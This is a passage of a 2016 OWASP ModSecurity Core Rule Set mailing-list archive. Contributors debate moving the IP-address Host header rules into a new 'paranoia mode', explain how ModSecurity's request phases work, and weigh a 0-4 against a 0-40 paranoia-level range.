From: barry_pollard at hotmail.com (Barry Pollard)
Date: Sun, 7 Feb 2016 22:01:39 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 960015 / 920300 and 960017 / 920350 (Header issues)
In-Reply-To: <20160207215355.GB1148@elias>
References: <20160202083257.GD29931@elias>
	<E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>
	<20160207202211.GF30297@elias>
	<DUB406-EAS80C7C8739638B1CFDD132482D40@phx.gbl>
	<20160207215355.GB1148@elias>
Message-ID: <DUB406-EAS36457A1851D46A06BE40FCE82D40@phx.gbl>

Well I'd argue most of those use hostname. Especially the other uptime monitors which, if external, then only have access via the main LoadBalancer. And, as I say, all of those are under the control of the SysAdmin(s), probably the first thing they tune, and unlikely to ever have to be touched again.

As a counter argument the number of Wordpress attack attempts I've seen, based on IP address on all my sites (none of which run Wordpress btw) suggests to me it's hackers running through IP addresses attempting to find a vulnerable WordPress installation - which probably doesn't take too many IP address attempts ;-)

Thanks,
Barry

> On 7 Feb 2016, at 21:53, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Barry,
> 
> Thanks for chiming in. The more people, the better decisions we will
> make.
> 
>> On Sun, Feb 07, 2016 at 09:40:20PM +0000, Barry Pollard wrote:
>> In my opinion there are few real world examples of people intentionally using IP address over hostname and the website owner should know them all (e.g. Load balancers, health checkers and internal system scanners). It's easy to whitelist those specific systems.
> 
> This is going to be anecdotal evidence, but I think it is not
> uncommon to have
> - 2 LBs (polling every 5 seconds each)
> - service monitor (polling once a minute)
> - 2 sysadmins configuring some kine of online
>  uptime monitor privately in order to get an
>  alarm ahead of time via text if something is
>  amiss. (polling every then seconds)
> 
> And all via the IP address. If you have two redundant
> servers, you easily get 60-70 alerts per minute.
> 
> But maybe the setups I know are just crazy.
> In the end, I can live with this rule in standard mode
> or in paranoia mode.
> 
> And it's not like it's hard to tune. It's just
> terrifying when it happens for the first time.
> 
> Cheers,
> 
> Christian
> 
> 
> 
> 
> 
> 
> 
> 
> 
>> 
>> So anything else using IP address is likely a bot iterating through IP addresses and I do think they represent a threat and not just an annoyance and so the CRS should block by default.
>> 
>> I also found it eye opening the amount of scanners hitting my sites when I turned ModSecurity on for the first time. Now granted most has likely been scanning my site for years with no issues, and they can cause people to panic when they see the sheer volume for first time, but I still think enlightening none the less.
>> 
>> So I'd be more in favour of leaving this in normal mode. Perhaps adding some commented out examples of how to whitelist certain IP addresses from this (or all?) rule(s) if it really is that common a problem that people get overwhelmed by their internal systems using IP address.
>> 
>> Thanks,
>> Barry
>> 
>> P.S. Some great discussions going on. Great to see!
>> 
>>> On 7 Feb 2016, at 20:32, Christian Folini <christian.folini at netnea.com> wrote:
>>> 
>>> Hello again,
>>> 
>>>> On Sun, Feb 07, 2016 at 03:22:03PM +0100, Walter Hop wrote:
>>>> In my logs I only see mass scanners trying this, and there is one vendor appliance which is doing ?compliance? checks on an IP address constantly. This appliance annoys me: you don?t even know my HOSTNAME and you make claims about my site actually being working and compliant? And people pay money for that? I like blocking that thing out of spite, but that?s just personal.
>>> 
>>> It's totally true that it's an annoying practice and 
>>> should be stopped. But if you look at it with the
>>> eyes of a newbie ModSec user, he will see a lot of
>>> FPs in this class, which block the view on the more
>>> severed alerts. Not necessarily by score, but by sheer
>>> number of alerts.
>>> 
>>> Moving it to paranoia mode would free the view on the
>>> more important exceptions.
>>> 
>>>> Anyway, you?ve given some good cases for allowing IP addresses, it?s not too controversial.
>>> 
>>> Thanks.
>>> 
>>>> On Sun, Feb 07, 2016 at 03:30:39PM +0000, Chaim Sanders wrote:
>>>> It's kind of a mixed bag because we still want ModSecurity to be effective at blocking the easy rift raft (opportunistic attackers) but we want it to be easy to configure. Perhaps we make a 'domain name' configuration in the setup.conf and if it has been configured the rule comes into effect. I don't know that IF they have a domain we see too many false positives, most are things that as walter described, are just laziness. Thoughts?
>>> 
>>> Why don't we simply move it to paranoia mode? Instead of having to
>>> understand the additional "domain name" config, a user simply raises the
>>> paranoia level and ends up with more positives and if he thinks
>>> some of these requests are leggit/FPs, he will whitelist them.
>>> That would have the same effect as the "domain name" configuration
>>> but with a more generic tuning process.
>>> 
>>> Ahoj,
>>> 
>>> Christian
>>> 
>>> 
>>> -- 
>>> It must be obvious... that there is a contradiction in wanting to
>>> be perfectly secure in a universe whose very nature is momentariness and
>>> fluidity.       
>>> -- Alan Watts
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From Lukas.Funk at united-security-providers.ch  Mon Feb  8 07:59:00 2016
From: Lukas.Funk at united-security-providers.ch (Funk, Lukas)
Date: Mon, 8 Feb 2016 07:59:00 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
 Proposal
In-Reply-To: <20160204095200.GA28896@elias>
References: <20160204095200.GA28896@elias>
Message-ID: <93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>

Hi Christian and all,

I follow the discussion about the paranoia mode with great interest. I think it could be a good starting point for ModSecurity users which do not have the expert knowledge of the rules.

Looking at your proposed structure of the paranoia mode setup, I think it's on a good track. The structure is easy to understand!
Unfortunately I can't comment the different rules, as I don't have much experience with them. 

Thanks to all of you putting such great effort to the CRS and I'm really looking forward to version 3!

Cheers, Lukas


>> Dear all,
>> 
>> With the progress we are making on the rules front, it is time to talk about
>> the way it could be implemented.
>> It's time for the show-me-the-code. He you go:
>> 
>> https://www.netnea.com/cms/2016/02/04/owasp-modsecurity-core-rules-
>> paranoia-mode-mechanics-proposal/
>> 
>> Feedback welcome!
>> 
>> Christian
-------------- next part --------------
A non-text attachment was scrubbed...
Name: smime.p7s
Type: application/x-pkcs7-signature
Size: 5505 bytes
Desc: not available
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160208/f80b94c2/attachment-0001.bin>

From aymeric.chaib at morpho.com  Mon Feb  8 11:24:40 2016
From: aymeric.chaib at morpho.com (CHAIB Aymeric (MORPHO))
Date: Mon, 8 Feb 2016 11:24:40 +0000
Subject: [Owasp-modsecurity-core-rule-set] Phase request
In-Reply-To: <20160204195633.GA19405@elias>
References: <ab177ae2f7ee416ab07bedb7f82b1319@Y0032XE.rd1.rf1>
	<20160204195633.GA19405@elias>
Message-ID: <3ef44f31501f4dfbbe49b70bb4d73b30@Y0032XE.rd1.rf1>

Hello Christian,

Thanks for this great explanation. I tested further and found a defecting rule (specific, not CRS) which caused the described behavior: no phase:2 rules on requests without body. I corrected the rule, it should resolve some of my issues. Now, it seems that requests which fail and are not served by Apache (e.g. "Invalid URI in Request.")  do not go through the phase:2 rules. Investigating.

Regards,
Aymeric

-----Message d'origine-----
De?: Christian Folini [mailto:christian.folini at time-machine.ch] 
Envoy??: jeudi 4 f?vrier 2016 20:57
??: CHAIB Aymeric (MORPHO)
Objet?: Re: [Owasp-modsecurity-core-rule-set] Phase request

Aymeric,

On Thu, Feb 04, 2016 at 10:29:44AM +0000, CHAIB Aymeric (MORPHO) wrote:
> I noticed that the version 3 of CRS ruleset sometimes transforms the 
> rule phase: from phase:1 (v2.2.9) to phase:request. But phase:request 
> just translates to phase:2 (request body) and, if I understand the 
> phase processing correctly, requests that do not contain a body will 
> not be checked against phase:2 rules. (Well, this is what I observe in 
> my debugging logs. Don't know if it is the ModSecurity standard 
> behavior or if it comes from my implementation.)

It's a bit different.

Traditionally ModSec has 5 phases:
1
2
3
4
5

5 is the logging phase when the request is already over.
3 and 4 are the response header and response body phases.

With 1 and 2 things are more complicated.

1 used to be the phase running after the requests headers where received. But then people constantly complained the rules in containers as directory / location would simply be ignored (container springing into action only when the request body was received). So Ivan Risti? (somebody correct me if it was not him) gave up and pushed phase 1 on the same apache hook as phase 2.

This means, that phase 1 runs on the same apache hook as phase 2. But phase 1 runs before phase 2. (which is a neat detail for some of the more adventurous rule contructs).

The method (or the fact that a request has a body or not) is irrelevant for the phases. Phase 2 happens no matter if there is a body or not.

If you are not happy with the merging of phase 1 and phase 2, then you can compile ModSec with the option --enable-request-early. That is a good practice in my eyes.
For it allows you to block a request _before_ you start to receive the request body. This could come to your advantage in special situations like the prevention of file uploads etc.

Lately, some of the phases received an alias:
 2 - request
 4 - response
 5 - logging

But that's just an alias.

Hope this helps. So it was a conscious move, but that does not mean that I think the general shift of rules onto phase 2 was a very good idea.

Ahoj,

Christian




> 
> A typical example is the rule id 960911 (REQUEST-20-PROTOCOL-ENFORCEMENT) which validates the HTTP request line: it seems to me that it should be validated for requests including those without body, but the phase is now phase:request on CRS v3.
> 
> Besides, there are a lot of other examples in 
> REQUEST-21-PROTOCOL-ATTACK where it seems to me that the rules should be put on phase:1. (E.g. smuggling, response splitting.) The same applies to REQUEST-10-IP-REPUTATION.
> 
> Do I miss something ? Is this a conscious choice ?
> Thanks for enlightening me.
> 
> Regards,
> Aymeric Chaib
> 
> #
> " This e-mail and any attached documents may contain confidential or proprietary information. If you are not the intended recipient, you are notified that any dissemination, copying of this e-mail and any attachments thereto or use of their contents by any means whatsoever is strictly prohibited. If you have received this e-mail in error, please advise the sender immediately and delete this e-mail and all attached documents from your computer system."
> #

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list 
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-s
> et

#
" This e-mail and any attached documents may contain confidential or proprietary information. If you are not the intended recipient, you are notified that any dissemination, copying of this e-mail and any attachments thereto or use of their contents by any means whatsoever is strictly prohibited. If you have received this e-mail in error, please advise the sender immediately and delete this e-mail and all attached documents from your computer system."
#

From christian.folini at netnea.com  Mon Feb  8 11:37:58 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 8 Feb 2016 12:37:58 +0100
Subject: [Owasp-modsecurity-core-rule-set] Phase request
In-Reply-To: <3ef44f31501f4dfbbe49b70bb4d73b30@Y0032XE.rd1.rf1>
References: <ab177ae2f7ee416ab07bedb7f82b1319@Y0032XE.rd1.rf1>
	<20160204195633.GA19405@elias>
	<3ef44f31501f4dfbbe49b70bb4d73b30@Y0032XE.rd1.rf1>
Message-ID: <20160208113758.GA16393@elias>

Thanks for the update, and good luck!

Christian

On Mon, Feb 08, 2016 at 11:24:40AM +0000, CHAIB Aymeric (MORPHO) wrote:
> Thanks for this great explanation. I tested further and found a defecting rule (specific, not CRS) which caused the described behavior: no phase:2 rules on requests without body. I corrected the rule, it should resolve some of my issues. Now, it seems that requests which fail and are not served by Apache (e.g. "Invalid URI in Request.")  do not go through the phase:2 rules. Investigating.
> 
> Regards,
> Aymeric
> 
> -----Message d'origine-----
> De?: Christian Folini [mailto:christian.folini at time-machine.ch] 
> Envoy??: jeudi 4 f?vrier 2016 20:57
> ??: CHAIB Aymeric (MORPHO)
> Objet?: Re: [Owasp-modsecurity-core-rule-set] Phase request
> 
> Aymeric,
> 
> On Thu, Feb 04, 2016 at 10:29:44AM +0000, CHAIB Aymeric (MORPHO) wrote:
> > I noticed that the version 3 of CRS ruleset sometimes transforms the 
> > rule phase: from phase:1 (v2.2.9) to phase:request. But phase:request 
> > just translates to phase:2 (request body) and, if I understand the 
> > phase processing correctly, requests that do not contain a body will 
> > not be checked against phase:2 rules. (Well, this is what I observe in 
> > my debugging logs. Don't know if it is the ModSecurity standard 
> > behavior or if it comes from my implementation.)
> 
> It's a bit different.
> 
> Traditionally ModSec has 5 phases:
> 1
> 2
> 3
> 4
> 5
> 
> 5 is the logging phase when the request is already over.
> 3 and 4 are the response header and response body phases.
> 
> With 1 and 2 things are more complicated.
> 
> 1 used to be the phase running after the requests headers where received. But then people constantly complained the rules in containers as directory / location would simply be ignored (container springing into action only when the request body was received). So Ivan Risti? (somebody correct me if it was not him) gave up and pushed phase 1 on the same apache hook as phase 2.
> 
> This means, that phase 1 runs on the same apache hook as phase 2. But phase 1 runs before phase 2. (which is a neat detail for some of the more adventurous rule contructs).
> 
> The method (or the fact that a request has a body or not) is irrelevant for the phases. Phase 2 happens no matter if there is a body or not.
> 
> If you are not happy with the merging of phase 1 and phase 2, then you can compile ModSec with the option --enable-request-early. That is a good practice in my eyes.
> For it allows you to block a request _before_ you start to receive the request body. This could come to your advantage in special situations like the prevention of file uploads etc.
> 
> Lately, some of the phases received an alias:
>  2 - request
>  4 - response
>  5 - logging
> 
> But that's just an alias.
> 
> Hope this helps. So it was a conscious move, but that does not mean that I think the general shift of rules onto phase 2 was a very good idea.
> 
> Ahoj,
> 
> Christian
> 
> 
> 
> 
> > 
> > A typical example is the rule id 960911 (REQUEST-20-PROTOCOL-ENFORCEMENT) which validates the HTTP request line: it seems to me that it should be validated for requests including those without body, but the phase is now phase:request on CRS v3.
> > 
> > Besides, there are a lot of other examples in 
> > REQUEST-21-PROTOCOL-ATTACK where it seems to me that the rules should be put on phase:1. (E.g. smuggling, response splitting.) The same applies to REQUEST-10-IP-REPUTATION.
> > 
> > Do I miss something ? Is this a conscious choice ?
> > Thanks for enlightening me.
> > 
> > Regards,
> > Aymeric Chaib
> > 
> > #
> > " This e-mail and any attached documents may contain confidential or proprietary information. If you are not the intended recipient, you are notified that any dissemination, copying of this e-mail and any attachments thereto or use of their contents by any means whatsoever is strictly prohibited. If you have received this e-mail in error, please advise the sender immediately and delete this e-mail and all attached documents from your computer system."
> > #
> 
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list 
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-s
> > et
> 
> #
> " This e-mail and any attached documents may contain confidential or proprietary information. If you are not the intended recipient, you are notified that any dissemination, copying of this e-mail and any attachments thereto or use of their contents by any means whatsoever is strictly prohibited. If you have received this e-mail in error, please advise the sender immediately and delete this e-mail and all attached documents from your computer system."
> #

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From CSanders at trustwave.com  Mon Feb  8 14:31:47 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 8 Feb 2016 14:31:47 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
 Proposal
In-Reply-To: <93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
Message-ID: <D2DE10F9.17557%csanders@trustwave.com>

Good writeup Christian!

On 2/8/16, 2:59 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
behalf of Lukas.Funk at united-security-providers.ch> wrote:

>Hi Christian and all,
>
>I follow the discussion about the paranoia mode with great interest. I
>think it could be a good starting point for ModSecurity users which do
>not have the expert knowledge of the rules.
>
>Looking at your proposed structure of the paranoia mode setup, I think
>it's on a good track. The structure is easy to understand!
>Unfortunately I can't comment the different rules, as I don't have much
>experience with them.
>
>Thanks to all of you putting such great effort to the CRS and I'm really
>looking forward to version 3!
>
>Cheers, Lukas
>
>
>>> Dear all,
>>>
>>> With the progress we are making on the rules front, it is time to talk
>>>about
>>> the way it could be implemented.
>>> It's time for the show-me-the-code. He you go:
>>>
>>>
>>>http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23NXMA
>>>8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2f04
>>>%2fowasp-modsecurity-core-rules-
>>> paranoia-mode-mechanics-proposal/
>>>
>>> Feedback welcome!
>>>
>>> Christian


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Mon Feb  8 21:12:12 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 8 Feb 2016 22:12:12 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
 Proposal
In-Reply-To: <D2DE10F9.17557%csanders@trustwave.com>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>
Message-ID: <20160208211212.GB29344@elias>

Thanks Chaim and Lukas!

I got positive feedback via private messages too.

The one question, where I am still unsure (and the
feedback / criticism is also split) is the question
of the good integer range for the paranoia level.
0-4 or rather 0-40.

Still not sure.

Thoughts on this question are thus very welcome.

Ahoj,

Christian


On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
> Good writeup Christian!
> 
> On 2/8/16, 2:59 AM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
> behalf of Lukas.Funk at united-security-providers.ch> wrote:
> 
> >Hi Christian and all,
> >
> >I follow the discussion about the paranoia mode with great interest. I
> >think it could be a good starting point for ModSecurity users which do
> >not have the expert knowledge of the rules.
> >
> >Looking at your proposed structure of the paranoia mode setup, I think
> >it's on a good track. The structure is easy to understand!
> >Unfortunately I can't comment the different rules, as I don't have much
> >experience with them.
> >
> >Thanks to all of you putting such great effort to the CRS and I'm really
> >looking forward to version 3!
> >
> >Cheers, Lukas
> >
> >
> >>> Dear all,
> >>>
> >>> With the progress we are making on the rules front, it is time to talk
> >>>about
> >>> the way it could be implemented.
> >>> It's time for the show-me-the-code. He you go:
> >>>
> >>>
> >>>http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23NXMA
> >>>8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2f04
> >>>%2fowasp-modsecurity-core-rules-
> >>> paranoia-mode-mechanics-proposal/
> >>>
> >>> Feedback welcome!
> >>>
> >>> Christian
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini
-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 181 bytes
Desc: Digital signature
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160208/459aed7b/attachment.pgp>

From mail at noelzindel.org  Tue Feb  9 04:20:16 2016
From: mail at noelzindel.org (=?utf-8?Q?No=C3=ABl_Zindel?=)
Date: Tue, 9 Feb 2016 05:20:16 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
	Proposal
In-Reply-To: <20160208211212.GB29344@elias>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>
	<20160208211212.GB29344@elias>
Message-ID: <438205E8-4FDE-4D2B-A17E-4244D73901B1@noelzindel.org>

Hi everyone,

let me chime in on this.

From a newbie perspective, I?d argue, the 0-4 definition would make sense since it would be a logical choice.
You should be able to easily distinct between the paranoia rating and the anomaly rating through the latter?s variable-definition e.g. warning, critical, ?

Nevertheless, Christian?s argument ?If we leave some room between the numbers, we have room to fill them in the future.? favours 0-40.
At least for me, since I like the idea of planning way ahead.

So, from my point of view, a range of 0-40 would be the favourable choice. But, it?s arbitrary nature would require a well-curated documentation.

It?s good to see the community?s commitment on this and I hope to be of any help.

Cheers,
No?l

> On 08 Feb 2016, at 22:12, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Thanks Chaim and Lukas!
> 
> I got positive feedback via private messages too.
> 
> The one question, where I am still unsure (and the
> feedback / criticism is also split) is the question
> of the good integer range for the paranoia level.
> 0-4 or rather 0-40.
> 
> Still not sure.
> 
> Thoughts on this question are thus very welcome.
> 
> Ahoj,
> 
> Christian
> 
> 
> On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
>> Good writeup Christian!
>> 
>> On 2/8/16, 2:59 AM,
>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
>> behalf of Lukas.Funk at united-security-providers.ch> wrote:
>> 
>>> Hi Christian and all,
>>> 
>>> I follow the discussion about the paranoia mode with great interest. I
>>> think it could be a good starting point for ModSecurity users which do
>>> not have the expert knowledge of the rules.
>>> 
>>> Looking at your proposed structure of the paranoia mode setup, I think
>>> it's on a good track. The structure is easy to understand!
>>> Unfortunately I can't comment the different rules, as I don't have much
>>> experience with them.
>>> 
>>> Thanks to all of you putting such great effort to the CRS and I'm really
>>> looking forward to version 3!
>>> 
>>> Cheers, Lukas
>>> 
>>> 
>>>>> Dear all,
>>>>> 
>>>>> With the progress we are making on the rules front, it is time to talk
>>>>> about
>>>>> the way it could be implemented.
>>>>> It's time for the show-me-the-code. He you go:
>>>>> 
>>>>> 
>>>>> http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23NXMA
>>>>> 8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2f04
>>>>> %2fowasp-modsecurity-core-rules-
>>>>> paranoia-mode-mechanics-proposal/
>>>>> 
>>>>> Feedback welcome!
>>>>> 
>>>>> Christian
>> 
>> 
>> ________________________________
>> 
>> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> 
> --
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 801 bytes
Desc: Message signed with OpenPGP using GPGMail
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/10512297/attachment.pgp>

From CSanders at trustwave.com  Tue Feb  9 04:53:52 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Tue, 9 Feb 2016 04:53:52 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
 Proposal
In-Reply-To: <438205E8-4FDE-4D2B-A17E-4244D73901B1@noelzindel.org>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com> <20160208211212.GB29344@elias>
	<438205E8-4FDE-4D2B-A17E-4244D73901B1@noelzindel.org>
Message-ID: <D2DEDAEE.175A2%csanders@trustwave.com>

Thanks Noel!
I will say @Christian that every time we leave space we never end up using
the space we leave I?d vote for just 0-4, but it is just one mans opinion.

On 2/8/16, 11:20 PM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of No?l
Zindel" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf
of mail at noelzindel.org> wrote:

>Hi everyone,
>
>let me chime in on this.
>
>From a newbie perspective, I?d argue, the 0-4 definition would make sense
>since it would be a logical choice.
>You should be able to easily distinct between the paranoia rating and the
>anomaly rating through the latter?s variable-definition e.g. warning,
>critical, ?
>
>Nevertheless, Christian?s argument ?If we leave some room between the
>numbers, we have room to fill them in the future.? favours 0-40.
>At least for me, since I like the idea of planning way ahead.
>
>So, from my point of view, a range of 0-40 would be the favourable
>choice. But, it?s arbitrary nature would require a well-curated
>documentation.
>
>It?s good to see the community?s commitment on this and I hope to be of
>any help.
>
>Cheers,
>No?l
>
>> On 08 Feb 2016, at 22:12, Christian Folini
>><christian.folini at netnea.com> wrote:
>>
>> Thanks Chaim and Lukas!
>>
>> I got positive feedback via private messages too.
>>
>> The one question, where I am still unsure (and the
>> feedback / criticism is also split) is the question
>> of the good integer range for the paranoia level.
>> 0-4 or rather 0-40.
>>
>> Still not sure.
>>
>> Thoughts on this question are thus very welcome.
>>
>> Ahoj,
>>
>> Christian
>>
>>
>> On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
>>> Good writeup Christian!
>>>
>>> On 2/8/16, 2:59 AM,
>>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>>> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>>>on
>>> behalf of Lukas.Funk at united-security-providers.ch> wrote:
>>>
>>>> Hi Christian and all,
>>>>
>>>> I follow the discussion about the paranoia mode with great interest. I
>>>> think it could be a good starting point for ModSecurity users which do
>>>> not have the expert knowledge of the rules.
>>>>
>>>> Looking at your proposed structure of the paranoia mode setup, I think
>>>> it's on a good track. The structure is easy to understand!
>>>> Unfortunately I can't comment the different rules, as I don't have
>>>>much
>>>> experience with them.
>>>>
>>>> Thanks to all of you putting such great effort to the CRS and I'm
>>>>really
>>>> looking forward to version 3!
>>>>
>>>> Cheers, Lukas
>>>>
>>>>
>>>>>> Dear all,
>>>>>>
>>>>>> With the progress we are making on the rules front, it is time to
>>>>>>talk
>>>>>> about
>>>>>> the way it could be implemented.
>>>>>> It's time for the show-me-the-code. He you go:
>>>>>>
>>>>>>
>>>>>>
>>>>>>http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23N
>>>>>>XMA
>>>>>>
>>>>>>8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2
>>>>>>f04
>>>>>> %2fowasp-modsecurity-core-rules-
>>>>>> paranoia-mode-mechanics-proposal/
>>>>>>
>>>>>> Feedback welcome!
>>>>>>
>>>>>> Christian
>>>
>>>
>>> ________________________________
>>>
>>> This transmission may contain information that is privileged,
>>>confidential, and/or exempt from disclosure under applicable law. If
>>>you are not the intended recipient, you are hereby notified that any
>>>disclosure, copying, distribution, or use of the information contained
>>>herein (including any reliance thereon) is strictly prohibited. If you
>>>received this transmission in error, please immediately contact the
>>>sender and destroy the material in its entirety, whether in electronic
>>>or hard copy format.
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>
>>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPVd
>>>MSLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
>>>2fowasp-modsecurity-core-rule-set
>>
>> --
>> mailto:christian.folini at netnea.com
>>
>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPVdM
>>SeebAdKbQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>> twitter: @ChrFolini
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPVdM
>>SLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From franziska.buehler.schmocker at gmail.com  Tue Feb  9 08:58:48 2016
From: franziska.buehler.schmocker at gmail.com (Franziska Buehler)
Date: Tue, 9 Feb 2016 09:58:48 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
	Proposal
In-Reply-To: <D2DEDAEE.175A2%csanders@trustwave.com>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>
	<20160208211212.GB29344@elias>
	<438205E8-4FDE-4D2B-A17E-4244D73901B1@noelzindel.org>
	<D2DEDAEE.175A2%csanders@trustwave.com>
Message-ID: <CALrdzmLmv28uT5A35fjMw8xNJg7Etqt9MjY1xd1h_VNx+qR3eg@mail.gmail.com>

Dear Christian,
Dear all,

Very clear and reasoned writing!
I see a benefit to choose the numbering of the paranoia level between 0 and 40.
It?s distinguishable from the anomaly scoring and does not lead to
misunderstanding.
Default set to 10 sounds good for me.
But I also see Chaim?s point not to leave that space.

Another question:
